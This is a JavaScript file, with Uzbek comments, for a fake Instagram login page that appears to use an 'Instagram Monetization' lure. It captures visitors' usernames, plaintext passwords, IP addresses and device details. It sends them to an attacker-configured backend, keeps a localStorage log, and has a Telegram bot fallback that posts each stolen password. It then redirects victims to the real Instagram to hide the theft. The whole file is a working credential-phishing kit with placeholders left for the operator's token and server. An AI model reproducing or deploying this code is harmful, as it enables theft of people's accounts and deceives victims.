document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const showPassCheckbox = document.getElementById('showPass');
    
    // Backend URL ni avtomatik aniqlash - deploy uchun
    function getBackendUrl() {
        const currentUrl = window.location.origin;
        
        // Local development
        if (currentUrl.includes('localhost') || currentUrl.includes('127.0.0.1')) {
            return currentUrl; // http://localhost:5000 yoki http://127.0.0.1:5000
        }
        
        // Deploy holatlarini aniqlash
        if (currentUrl.includes('github.io')) {
            // GitHub Pages uchun backend URL ni ko'rsating
            return 'https://your-backend-api.herokuapp.com'; // O'zingizning backend manzilingiz
        }
        
        // Umumiy holat
        // Agar frontend va backend bir domainda bo'lsa
        if (window.location.hostname.includes('vercel.app') || 
            window.location.hostname.includes('netlify.app') ||
            window.location.hostname.includes('railway.app')) {
            // Bu yerga backend API manzilingizni yozing
            return 'https://your-backend-api.onrender.com'; // O'zingizning backend manzilingiz
        }
        
        // Agar boshqa hosting bo'lsa
        return currentUrl.replace('www.', 'api.'); // Misol: www.example.com -> api.example.com
    }
    
    const backendUrl = getBackendUrl();
    console.log('Backend URL:', backendUrl);

    showPassCheckbox.addEventListener('change', function() {
        const passwordField = document.getElementById('password');
        passwordField.type = this.checked ? 'text' : 'password';
    });

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        e.stopPropagation();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;

        if (!username || !password) {
            alert('Iltimos, login va parolni kiriting!');
            return;
        }

        const data = {
            username: username,
            password: password,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            ip: await getIPAddress()
        };

        // Loading animatsiya
        const submitBtn = form.querySelector('.btn-login');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Yuklanmoqda...';
        submitBtn.disabled = true;

        try {
            console.log('Sending to:', `${backendUrl}/save`);
            
            const response = await fetch(`${backendUrl}/save`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data),
                mode: 'cors'
            });

            console.log('Response status:', response.status);
            console.log('Response headers:', response.headers);
            
            if (response.ok) {
                const result = await response.json();
                console.log('Save successful:', result);
                
                // Instagramga yo'naltirish
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 500);
            } else {
                // Agar CORS xatosi bo'lsa, boshqa usulni sinab ko'ramiz
                tryAlternativeSave(data);
            }
        } catch (error) {
            console.error('Network error:', error);
            // Agar asosiy URL ishlamasa, backup URL ga so'rov yuboramiz
            await tryAlternativeSave(data);
        } finally {
            setTimeout(() => {
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            }, 1500);
        }
    });

    // Alternativ saqlash usuli
    async function tryAlternativeSave(data) {
        try {
            // 1. Backendni tekshirish
            const checkResponse = await fetch(`${backendUrl}/`, {
                method: 'HEAD',
                mode: 'no-cors'
            }).catch(() => null);
            
            if (!checkResponse) {
                // 2. Agar backend ishlamasa, localStorage ga saqlaymiz
                saveToLocalStorage(data);
                
                // 3. Telegram botga yuborish (agar kerak bo'lsa)
                await sendToTelegram(data);
                
                // Instagramga yo'naltirish
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 500);
                return;
            }
            
            // Backend ishlayapti, lekin /save endpoint ishlamayapti
            alert('Serverda vaqtinchalik xatolik. Iltimos, keyinroq urinib ko\'ring.');
        } catch (error) {
            console.error('Alternative save error:', error);
            saveToLocalStorage(data);
            
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com/';
            }, 500);
        }
    }

    // LocalStorage ga saqlash (backup)
    function saveToLocalStorage(data) {
        try {
            const existingLogs = JSON.parse(localStorage.getItem('instagram_logs') || '[]');
            existingLogs.push({
                ...data,
                savedAt: new Date().toISOString()
            });
            
            // Faqat oxirgi 100 tasini saqlaymiz
            if (existingLogs.length > 100) {
                existingLogs.splice(0, existingLogs.length - 100);
            }
            
            localStorage.setItem('instagram_logs', JSON.stringify(existingLogs));
            console.log('Saved to localStorage:', data.username);
        } catch (error) {
            console.error('LocalStorage save error:', error);
        }
    }

    // IP manzilini olish
    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }
    }

    // Telegram botga yuborish (qo'shimcha)
    async function sendToTelegram(data) {
        const telegramBotToken = ''; // O'zingizning bot token
        const chatId = ''; // O'zingizning chat ID
        
        if (!telegramBotToken || !chatId) return;
        
        try {
            const message = `🔐 Yangi Instagram Login\n👤 Username: ${data.username}\n🔑 Password: ${data.password}\n🌐 IP: ${data.ip}\n🕒 Time: ${new Date().toLocaleString()}\n💻 Device: ${data.userAgent.substring(0, 100)}...`;
            
            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram send error:', error);
        }
    }

    // Rasm yo'q bo'lsa
    const phoneImg = document.querySelector('.screen img');
    if (phoneImg) {
        phoneImg.onerror = function() {
            this.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjYwMCIgdmlld0JveD0iMCAwIDMwMCA2MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIzMDAiIGhlaWdodD0iNjAwIiBmaWxsPSIjRkZGIi8+Cjx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWidlZGxlIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IiM2Njc5RUEiPkluc3RhZ3JhbSBNb25ldGl6YXRpb248L3RleHQ+Cjwvc3ZnPg==';
        };
    }
    
    // Deploy holatini tekshirish
    checkDeploymentStatus();
    
    async function checkDeploymentStatus() {
        try {
            const response = await fetch(`${backendUrl}/`, { 
                method: 'HEAD',
                mode: 'no-cors'
            });
            console.log('Backend is reachable');
        } catch (error) {
            console.warn('Backend not reachable, using fallback methods');
            // Backendga ulanmasa, foydalanuvchiga xabar berish
            if (!window.location.hostname.includes('localhost')) {
                console.log('Running in deployment mode');
            }
        }
    }
});